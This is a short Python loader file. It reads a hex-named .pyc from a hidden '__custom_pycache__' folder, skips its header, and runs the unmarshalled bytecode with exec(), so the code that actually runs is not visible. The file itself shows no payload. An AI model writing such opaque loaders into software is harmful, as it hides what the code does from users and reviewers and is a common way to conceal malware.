
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'parrot_8c2b1ac0520e455cb41128a4c6316900.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
